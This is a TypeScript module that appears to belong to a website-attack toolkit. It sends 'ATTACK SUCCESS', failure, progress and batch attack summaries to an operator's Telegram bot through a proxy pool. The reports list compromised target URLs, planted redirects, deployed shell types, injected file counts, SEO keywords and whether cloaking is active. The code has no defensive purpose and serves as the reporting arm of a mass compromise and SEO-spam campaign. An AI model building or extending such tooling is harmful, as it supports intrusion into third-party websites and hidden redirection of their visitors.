/**
 * Telegram Notifier — Send attack results via Telegram Bot API
 * 
 * Replaces email notifications with Telegram messages.
 * Supports:
 * - Success/failure notifications with details
 * - Deployed URLs with clickable links
 * - Pipeline progress updates
 * - Rich formatting with Markdown
 */

import { ENV } from "./_core/env";
import { fetchWithPoolProxy } from "./proxy-pool";

// ═══════════════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════════════

export interface TelegramConfig {
  botToken: string;
  chatId: string;
}

export interface TelegramNotification {
  type: "success" | "failure" | "partial" | "progress" | "info";
  targetUrl: string;
  redirectUrl?: string;
  deployedUrls?: string[];
  shellType?: string;
  duration?: number;
  errors?: string[];
  details?: string;
  keywords?: string[];
  cloakingEnabled?: boolean;
  injectedFiles?: number;
}

interface TelegramSendResult {
  success: boolean;
  messageId?: number;
  error?: string;
}

// ═══════════════════════════════════════════════════════
//  TELEGRAM API
// ═══════════════════════════════════════════════════════

async function sendTelegramMessage(
  config: TelegramConfig,
  text: string,
  parseMode: "MarkdownV2" | "HTML" = "HTML",
): Promise<TelegramSendResult> {
  try {
    const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
    
    const { response } = await fetchWithPoolProxy(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: config.chatId,
        text,
        parse_mode: parseMode,
        disable_web_page_preview: false,
      }),
      signal: AbortSignal.timeout(10000),
    }, { targetDomain: "api.telegram.org", timeout: 10000 });

    const result = await response.json() as any;
    
    if (result.ok) {
      return { success: true, messageId: result.result?.message_id };
    } else {
      return { success: false, error: result.description || "Unknown Telegram API error" };
    }
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}

// ═══════════════════════════════════════════════════════
//  GET CONFIG FROM ENV
// ═══════════════════════════════════════════════════════

export function getTelegramConfig(): TelegramConfig | null {
  const botToken = ENV.telegramBotToken;
  const chatId = ENV.telegramChatId;
  
  if (!botToken || !chatId) {
    return null;
  }
  
  return { botToken, chatId };
}

// ═══════════════════════════════════════════════════════
//  NOTIFICATION FORMATTERS
// ═══════════════════════════════════════════════════════

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

function formatSuccessMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🎯 <b>ATTACK SUCCESS</b> 🎯");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("✅ <b>Deployed URLs:</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.shellType) {
    lines.push(`🐚 <b>Shell Type:</b> ${escapeHtml(notification.shellType)}`);
  }
  
  if (notification.keywords && notification.keywords.length > 0) {
    lines.push(`🔑 <b>Keywords:</b> ${notification.keywords.map(k => escapeHtml(k)).join(", ")}`);
  }
  
  if (notification.cloakingEnabled) {
    lines.push(`🎭 <b>Cloaking:</b> Active`);
    if (notification.injectedFiles && notification.injectedFiles > 0) {
      lines.push(`💉 <b>Injected Files:</b> ${notification.injectedFiles}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatFailureMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("❌ <b>ATTACK FAILED</b> ❌");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.redirectUrl) {
    lines.push(`🔗 <b>Redirect:</b> ${escapeHtml(notification.redirectUrl)}`);
  }
  
  if (notification.errors && notification.errors.length > 0) {
    lines.push("");
    lines.push("⚠️ <b>Errors:</b>");
    for (const err of notification.errors.slice(0, 5)) {
      lines.push(`  • ${escapeHtml(err.substring(0, 100))}`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  if (notification.details) {
    lines.push("");
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatPartialMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("⚠️ <b>PARTIAL SUCCESS</b> ⚠️");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.deployedUrls && notification.deployedUrls.length > 0) {
    lines.push("");
    lines.push("📁 <b>Files Uploaded (redirect not verified):</b>");
    for (const url of notification.deployedUrls) {
      lines.push(`  • <a href="${escapeHtml(url)}">${escapeHtml(url)}</a>`);
    }
  }
  
  if (notification.duration) {
    lines.push(`⏱ <b>Duration:</b> ${Math.round(notification.duration / 1000)}s`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

function formatProgressMessage(notification: TelegramNotification): string {
  const lines: string[] = [];
  
  lines.push("🔄 <b>PIPELINE PROGRESS</b>");
  lines.push("");
  lines.push(`🌐 <b>Target:</b> ${escapeHtml(notification.targetUrl)}`);
  
  if (notification.details) {
    lines.push(`📝 ${escapeHtml(notification.details)}`);
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return lines.join("\n");
}

// ═══════════════════════════════════════════════════════
//  MAIN: Send Notification
// ═══════════════════════════════════════════════════════

export async function sendTelegramNotification(
  notification: TelegramNotification,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured (missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID)" };
  }

  let message: string;
  
  switch (notification.type) {
    case "success":
      message = formatSuccessMessage(notification);
      break;
    case "failure":
      message = formatFailureMessage(notification);
      break;
    case "partial":
      message = formatPartialMessage(notification);
      break;
    case "progress":
      message = formatProgressMessage(notification);
      break;
    case "info":
    default:
      message = formatProgressMessage(notification);
      break;
  }

  return sendTelegramMessage(config, message, "HTML");
}

// ═══════════════════════════════════════════════════════
//  BATCH NOTIFICATION
// ═══════════════════════════════════════════════════════

/**
 * Send a batch summary notification for multiple targets
 */
export async function sendBatchSummary(
  results: Array<{
    targetUrl: string;
    success: boolean;
    deployedUrls: string[];
    errors: string[];
  }>,
  configOverride?: TelegramConfig,
): Promise<TelegramSendResult> {
  const config = configOverride || getTelegramConfig();
  
  if (!config) {
    return { success: false, error: "Telegram not configured" };
  }

  const successCount = results.filter(r => r.success).length;
  const failCount = results.filter(r => !r.success).length;
  
  const lines: string[] = [];
  lines.push("📊 <b>BATCH ATTACK SUMMARY</b> 📊");
  lines.push("");
  lines.push(`✅ Success: ${successCount}`);
  lines.push(`❌ Failed: ${failCount}`);
  lines.push(`📊 Total: ${results.length}`);
  lines.push("");
  
  for (const result of results) {
    const icon = result.success ? "✅" : "❌";
    lines.push(`${icon} ${escapeHtml(result.targetUrl)}`);
    if (result.deployedUrls.length > 0) {
      for (const url of result.deployedUrls.slice(0, 2)) {
        lines.push(`  └ <a href="${escapeHtml(url)}">${escapeHtml(url.substring(0, 50))}...</a>`);
      }
    }
  }
  
  lines.push("");
  lines.push(`🕐 ${new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" })}`);
  
  return sendTelegramMessage(config, lines.join("\n"), "HTML");
}

// ═══════════════════════════════════════════════════════
//  VERIFY BOT TOKEN
// ═══════════════════════════════════════════════════════

export async function verifyTelegramBot(botToken: string): Promise<{ valid: boolean; botName?: string; error?: string }> {
  try {
    const url = `https://api.telegram.org/bot${botToken}/getMe`;
    const { response } = await fetchWithPoolProxy(url, { signal: AbortSignal.timeout(5000) }, { targetDomain: "api.telegram.org", timeout: 5000 });
    const result = await response.json() as any;
    
    if (result.ok) {
      return { valid: true, botName: result.result?.username };
    } else {
      return { valid: false, error: result.description };
    }
  } catch (error: any) {
    return { valid: false, error: error.message };
  }
}
